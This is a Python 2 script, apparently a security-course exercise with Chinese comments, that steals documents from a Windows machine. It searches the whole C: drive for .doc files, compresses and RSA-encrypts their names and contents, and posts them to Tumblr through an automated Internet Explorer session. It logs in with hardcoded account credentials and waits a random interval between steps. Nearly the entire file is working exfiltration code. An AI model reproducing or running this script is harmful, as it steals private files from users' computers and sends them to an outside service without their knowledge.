#-*- coding:utf-8 -*-
import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "jms@bughunter.ca"
password = "justinBHP2014"

public_key ="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA62gdG1nW+82bf9j24ufK\
QaLNb2nFbawSboKhHbPKpCc8v9YpiKuOkHc51I0aBmBEWDsG6kg8c/Ca43prPjll\
MZp2KdUE8qpwBB6Md/E9OD8KBLPOFjQpAyf49MVZ7YIAeXhCgwDO7r+XIrp0EcBJ\
QjWnAbvlhwhpi1IMZKtXu8PyO5s88QxxrFwymm96Ug3JLHVsTKXJ/kOd0Pd+wnjk\
pZfZolMBX1Tfxj7rpUpfkpzJnLkHuHG4hEAP4jLrH640PdioUKfrHopUAtnF0Mlb\
PbHGPUluq1uv39rYUw3MnzDKmyY8k7b1Kle36ip4Nwffq84NrdH6+0wgQBa6AesY\
xwIDAQAB"


def wait_for_browser(browser):
    #等待浏览器加载完一个页面
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return
def encrypt_string(plaintext):
    chunk_size = 256
    print "Compressing : %d bytes"%len(plaintext)
    plaintext = zlib.compress(plaintext)

    print "Encrypting %d bytes"%len(plaintext)

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0
    while offset<len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        if len(chunk) % chunk_size !=0:
            chunk += " "*(chunk_size-len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = encrypted.encode("base64")
    print "Base64 encoded crypto:%d"%len(encrypted)
    return encrypted

def encrypt_post(filename):
    #打开并读取文件
    fd = open(filename,'rb')
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)
    return encrypted_title,encrypted_body

def random_sleep():
    time.sleep(random.randint(5,10))
    return

def login_to_tumblr(ie):
    #解析文档中的所有元素
    full_doc = ie.Document.all

    #迭代每个元素来查找登录表单
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value",username)
        elif i.id=="signup_password":
            i.setAttribute("value",password)
    random_sleep()

    # 你会遇到不同的登录主页
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError,e:
        pass
    random_sleep()

    wait_for_browser(ie)

    return

def post_to_tumblr(ie,title,post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value",title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML",post)
            print "set text area"
            i.focus()
        elif i.id == "create_post":
            print "found post button"
            post_form = i
            i.focus()
    random_sleep()
    title_box.focus()
    random_sleep()

    #提交表单
    post_form.children[0].click()
    wait_for_browser(ie)
    random_sleep()
    return
def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    #访问图tumnblr站点并登录
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print "logging in ..."
    login_to_tumblr(ie)
    print "logged in ... navigating"

    ie.Navigate("http://www.tumblr.com/new/text")
    wait_for_browser(ie)

    #加密文件
    title,body = encrypt_post(document_path)

    print "creating new post..."
    post_to_tumblr(ie,title,body)
    print "Posted"

    #销毁IE实例
    ie.Quit()
    ie = None
    return
# 用户文档检索的主循环
for parent,directories,filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames,"*%s"%doc_type):
        document_path = os.path.join(parent,filename)
        print "Found:%s"%document_path
        exfiltrate(document_path)
        raw_input("continue?")



